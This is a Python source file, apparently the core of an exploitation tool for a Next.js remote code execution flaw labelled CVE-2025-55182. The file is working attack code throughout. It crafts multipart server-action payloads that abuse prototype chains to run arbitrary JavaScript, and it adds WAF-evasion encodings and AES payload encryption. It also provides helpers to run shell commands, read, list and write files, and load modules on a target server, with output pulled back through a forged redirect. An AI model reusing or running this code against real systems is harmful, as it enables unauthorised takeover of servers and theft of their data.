"""Core exploit logic for CVE-2025-55182."""
import base64
import json
import os
import re
import urllib.parse
from io import BytesIO
from typing import Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from core.types import ExploitResult, RemoteFile
from utils import crypto, encoding


class CVEExploit:
    """Exploit handler for CVE-2025-55182 (Next.js RCE)."""
    
    def __init__(self, timeout: int = 30, verify_ssl: bool = False):
        """
        Initialize exploit client.
        
        Args:
            timeout: Request timeout in seconds (default: 30)
            verify_ssl: Whether to verify SSL certificates
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        self.proxy_config = None
        
        # Create session with NO retry strategy for faster timeout
        self.session = requests.Session()
        # Disable ALL retries completely - no retry at all for immediate timeout
        # Using Retry.DISABLED or explicit 0 for all retry types
        retry_strategy = Retry(
            total=0,  # No retries at all
            connect=0,  # No connection retries
            read=0,  # No read retries
            redirect=0,  # No redirect retries
            status=0,  # No status retries
            other=0,  # No other retries
            backoff_factor=0,
            status_forcelist=[],
            allowed_methods=[],
            raise_on_status=False
        )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=10,
            pool_maxsize=10
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Configure SSL verification
        self.session.verify = verify_ssl
    
    def update_proxy(self, enable: bool, proxy_addr: str) -> Optional[str]:
        """
        Update proxy configuration.
        
        Args:
            enable: Whether to enable proxy
            proxy_addr: Proxy address (e.g., "127.0.0.1:8080")
            
        Returns:
            Error message if failed, None otherwise
        """
        if not enable or not proxy_addr:
            self.proxy_config = None
            self.session.proxies = {}
            return None
        
        # Normalize proxy address
        proxy_url = proxy_addr
        if not any(proxy_url.startswith(p) for p in ('http://', 'https://', 'socks5://')):
            proxy_url = 'http://' + proxy_url
        
        try:
            # Validate proxy URL
            parsed = urllib.parse.urlparse(proxy_url)
            if not parsed.scheme or not parsed.netloc:
                return f"Format alamat proxy salah: {proxy_addr}"
            
            self.proxy_config = proxy_url
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            return None
        except Exception as e:
            return f"Format alamat proxy salah: {e}"
    
    def update_timeout(self, timeout: int):
        """
        Update request timeout.
        
        Args:
            timeout: New timeout value in seconds
        """
        self.timeout = timeout
    
    def send_complex_payload(
        self,
        target_url: str,
        endpoint: str,
        js_code: str,
        use_unicode_waf: bool,
        use_utf16_waf: bool,
        use_aes: bool,
        payload_type: str
    ) -> ExploitResult:
        """
        Send complex payload to target.
        
        Args:
            target_url: Target URL
            endpoint: API endpoint path
            js_code: JavaScript code to execute
            use_unicode_waf: Enable Unicode encoding for WAF bypass
            use_utf16_waf: Enable UTF-16LE encoding for WAF bypass
            use_aes: Enable AES encryption
            payload_type: "Prototype Chain" or "Array Map Chain"
            
        Returns:
            ExploitResult with success status and result/error
        """
        # Normalize URL
        target_url = self._normalize_url(target_url)
        if not target_url:
            return ExploitResult(success=False, error="URL tidak valid")
        
        # Normalize endpoint
        if not endpoint.startswith('/'):
            endpoint = '/' + endpoint
        
        full_url = target_url.rstrip('/') + endpoint
        
        # Encrypt payload if needed
        final_js = js_code
        if use_aes:
            try:
                final_js = crypto.generate_encrypted_payload(js_code)
            except Exception as e:
                return ExploitResult(success=False, error=f"Gagal mengenkripsi Payload: {e}")
        
        # Build injection payload
        injection = f"var res={final_js};if(typeof res!=='string'){{try{{res=JSON.stringify(res,null,2)}}catch(e){{res='[JSON Error]'}}}};throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: 'NEXT_REDIRECT;push;/login?a=' + encodeURIComponent(res) + ';307;'}});"
        
        # Build multipart form data manually for proper UTF-16LE support
        boundary = f"----WebKitFormBoundary{''.join([f'{i:02x}' for i in os.urandom(16)])}"
        body_parts = []
        
        def add_field(name: str, value: bytes, use_utf16: bool):
            """Add form field to multipart body."""
            content_type = 'text/plain; charset=utf-16le' if use_utf16 else 'text/plain'
            body_parts.append(f'--{boundary}\r\n'.encode('ascii'))
            body_parts.append(f'Content-Disposition: form-data; name="{name}"\r\n'.encode('ascii'))
            body_parts.append(f'Content-Type: {content_type}\r\n\r\n'.encode('ascii'))
            body_parts.append(value)
            body_parts.append(b'\r\n')
        
        if payload_type == "Array Map Chain":
            injection += "//"
            field_0 = b'"$1"'
            add_field('0', self._encode_field(field_0, use_utf16_waf), use_utf16_waf)
            
            val_json = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
            fake_chunk = {
                "status": "resolved_model",
                "reason": 0,
                "_response": "$4",
                "value": val_json,
                "then": "$2:then"
            }
            b1 = encoding.marshal_json(fake_chunk)
            if use_unicode_waf:
                b1 = encoding.encode_unicode(b1)
            add_field('1', self._encode_field(b1, use_utf16_waf), use_utf16_waf)
            
            add_field('2', self._encode_field(b'"$@3"', use_utf16_waf), use_utf16_waf)
            add_field('3', self._encode_field(b'[]', use_utf16_waf), use_utf16_waf)
            
            fake_resp = {
                "_prefix": injection,
                "_formData": {
                    "get": "$3:constructor:constructor"
                },
                "_chunks": "$2:_response:_chunks"
            }
            b4 = encoding.marshal_json(fake_resp)
            if use_unicode_waf:
                b4 = encoding.encode_unicode(b4)
            add_field('4', self._encode_field(b4, use_utf16_waf), use_utf16_waf)
        else:
            # Prototype Chain
            payload_map = {
                "then": "$1:__proto__:then",
                "status": "resolved_model",
                "reason": -1,
                "value": '{"then":"$B1337"}',
                "_response": {
                    "_prefix": injection,
                    "_chunks": "$Q2",
                    "_formData": {
                        "get": "$1:constructor:constructor"
                    }
                }
            }
            payload_bytes = encoding.marshal_json(payload_map)
            if use_unicode_waf:
                payload_bytes = encoding.encode_unicode(payload_bytes)
            
            add_field('0', self._encode_field(payload_bytes, use_utf16_waf), use_utf16_waf)
            add_field('1', self._encode_field(b'"$@0"', use_utf16_waf), use_utf16_waf)
            add_field('2', self._encode_field(b'[]', use_utf16_waf), use_utf16_waf)
        
        # Close multipart
        body_parts.append(f'--{boundary}--\r\n'.encode('ascii'))
        body_data = b''.join(body_parts)
        
        # Send request
        try:
            headers = {
                'User-Agent': self.user_agent,
                'Next-Action': 'x',
                'Content-Type': f'multipart/form-data; boundary={boundary}'
            }
            
            # Use tuple timeout: (connect_timeout, read_timeout)
            # Connect timeout: 3 seconds (fast fail on slow connections)
            # Read timeout: remaining time
            connect_timeout = min(3, self.timeout - 1) if self.timeout > 1 else 1
            read_timeout = max(1, self.timeout - connect_timeout)
            timeout_tuple = (connect_timeout, read_timeout)
            
            response = self.session.post(
                full_url,
                data=body_data,
                headers=headers,
                timeout=timeout_tuple,
                verify=self.verify_ssl
            )
            
            # Extract result from redirect
            raw_location = ""
            if 'X-Action-Redirect' in response.headers:
                raw_location = response.headers['X-Action-Redirect']
            else:
                raw_location = response.text
            
            # Parse result from URL parameter
            match = re.search(r'[?&]a=([^;&]+)', raw_location)
            if match:
                encoded_val = match.group(1)
                try:
                    decoded = urllib.parse.unquote(encoded_val)
                    return ExploitResult(success=True, result=decoded, status_code=response.status_code)
                except Exception:
                    return ExploitResult(success=True, result=encoded_val, status_code=response.status_code)
            
            if response.status_code == 500:
                return ExploitResult(success=False, error="Server 500 Error (Execution Failed or Syntax Error)", status_code=500)
            
            return ExploitResult(success=False, error="Payload sent but no result captured.", status_code=response.status_code)
            
        except requests.exceptions.Timeout as e:
            return ExploitResult(
                success=False, 
                error=f"Request timeout ({self.timeout}s). Perintah mungkin membutuhkan waktu lebih lama. Coba tingkatkan timeout atau gunakan mode async untuk perintah yang berat.",
                status_code=None
            )
        except requests.exceptions.ConnectionError as e:
            return ExploitResult(success=False, error=f"Koneksi gagal: {e}", status_code=None)
        except requests.exceptions.RequestException as e:
            # Try to extract status code from exception if available
            status_code = None
            if hasattr(e, 'response') and e.response is not None:
                status_code = e.response.status_code
            return ExploitResult(success=False, error=f"Permintaan gagal: {e}", status_code=status_code)
        except Exception as e:
            return ExploitResult(success=False, error=f"Error tidak diketahui: {e}", status_code=None)
    
    def execute_js_raw(
        self,
        target_url: str,
        endpoint: str,
        code: str,
        use_unicode_waf: bool,
        use_utf16_waf: bool,
        use_aes: bool,
        payload_type: str
    ) -> str:
        """
        Execute raw JavaScript code.
        
        Returns:
            Execution result string
        """
        res = self.send_complex_payload(
            target_url, endpoint, code,
            use_unicode_waf, use_utf16_waf, use_aes, payload_type
        )
        if not res.success:
            raise Exception(f"Tidak ada output atau gagal: {res.error}")
        return res.result
    
    def execute_command_auto(
        self,
        target_url: str,
        endpoint: str,
        command: str,
        use_unicode_waf: bool,
        use_utf16_waf: bool,
        use_aes: bool,
        is_async: bool,
        payload_type: str
    ) -> str:
        """
        Execute system command.
        
        Args:
            is_async: If True, use exec (no output), else execSync (with output)
            
        Returns:
            Command output or status message
        """
        escaped_cmd = command
        if not use_aes:
            escaped_cmd = command.replace("'", "\\'")
        
        if is_async:
            payload = f"(function(){{ process.mainModule.require('child_process').exec('{escaped_cmd}'); return 'Async execution started (No Output)'; }})()"
        else:
            payload = f"process.mainModule.require('child_process').execSync('{escaped_cmd}').toString()"
        
        res = self.send_complex_payload(
            target_url, endpoint, payload,
            use_unicode_waf, use_utf16_waf, use_aes, payload_type
        )
        if not res.success:
            raise Exception(f"Eksekusi gagal: {res.error}")
        return res.result
    
    def read_file(
        self,
        target_url: str,
        endpoint: str,
        file_path: str,
        use_unicode_waf: bool,
        use_utf16_waf: bool,
        use_aes: bool,
        payload_type: str
    ) -> str:
        """Read file from remote server."""
        escaped_path = file_path.replace("'", "\\'")
        payload = f"process.mainModule.require('fs').readFileSync('{escaped_path}', 'utf-8')"
        
        res = self.send_complex_payload(
            target_url, endpoint, payload,
            use_unicode_waf, use_utf16_waf, use_aes, payload_type
        )
        if not res.success:
            raise Exception(f"Gagal membaca: {res.error}")
        return res.result
    
    def list_files(
        self,
        target_url: str,
        endpoint: str,
        dir_path: str,
        use_unicode_waf: bool,
        use_utf16_waf: bool,
        use_aes: bool,
        payload_type: str
    ) -> list[RemoteFile]:
        """List files in remote directory."""
        escaped_path = dir_path.replace("'", "\\'")
        payload = f"""(function(){{
            try {{
                const fs = process.mainModule.require('fs');
                const p = process.mainModule.require('path');
                const target = '{escaped_path}';
                const items = fs.readdirSync(target);
                const ret = items.map(i => {{
                    try {{
                        const s = fs.statSync(p.join(target, i));
                        return {{ n: i, d: s.isDirectory(), s: s.size }};
                    }} catch(e) {{ return {{ n: i, d: false, s: -1 }}; }}
                }});
                return JSON.stringify(ret);
            }} catch(e) {{ return "ERROR: " + e.message; }}
        }})()"""
        
        res = self.send_complex_payload(
            target_url, endpoint, payload,
            use_unicode_waf, use_utf16_waf, use_aes, payload_type
        )
        if not res.success:
            raise Exception(f"Operasi gagal: {res.error}")
        
        if res.result.startswith("ERROR:"):
            raise Exception(f"Error di server: {res.result}")
        
        try:
            files_json = json.loads(res.result)
            files = [RemoteFile.from_json(f) for f in files_json]
            
            # Sort: directories first, then by name
            files.sort(key=lambda f: (not f.is_dir, f.name))
            return files
        except json.JSONDecodeError as e:
            raise Exception(f"Gagal memparse data direktori: {e}, konten asli: {res.result}")
    
    def write_file(
        self,
        target_url: str,
        endpoint: str,
        file_path: str,
        content: str,
        use_unicode_waf: bool,
        use_utf16_waf: bool,
        use_aes: bool,
        payload_type: str
    ) -> str:
        """Write file to remote server."""
        escaped_path = file_path.replace("'", "\\'")
        b64_content = base64.b64encode(content.encode('utf-8')).decode('ascii')
        payload = f"""(function(){{ 
            const fs = process.mainModule.require('fs');
            const buf = Buffer.from('{b64_content}', 'base64');
            fs.writeFileSync('{escaped_path}', buf); 
            return 'Write Success'; 
        }})()"""
        
        res = self.send_complex_payload(
            target_url, endpoint, payload,
            use_unicode_waf, use_utf16_waf, use_aes, payload_type
        )
        if not res.success:
            raise Exception(f"Gagal menulis: {res.error}")
        return res.result
    
    def load_module(
        self,
        target_url: str,
        endpoint: str,
        module_path: str,
        use_unicode_waf: bool,
        use_utf16_waf: bool,
        use_aes: bool,
        payload_type: str
    ) -> str:
        """Load Node.js module using module._load."""
        escaped_path = module_path.replace("'", "\\'")
        payload = f"process.mainModule.require('module')._load('{escaped_path}')"
        
        res = self.send_complex_payload(
            target_url, endpoint, payload,
            use_unicode_waf, use_utf16_waf, use_aes, payload_type
        )
        if not res.success:
            raise Exception(f"Gagal memuat: {res.error}")
        return res.result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL format."""
        url = url.strip()
        if not url:
            return ""
        if not url.startswith(('http://', 'https://')):
            return 'http://' + url
        return url
    
    def _encode_field(self, data: bytes, use_utf16: bool) -> bytes:
        """Encode field data according to encoding option."""
        if use_utf16:
            # Convert bytes to string first, then encode as UTF-16LE
            try:
                text = data.decode('utf-8')
                return encoding.encode_utf16le(text)
            except UnicodeDecodeError:
                # If already binary, just return
                return data
        return data

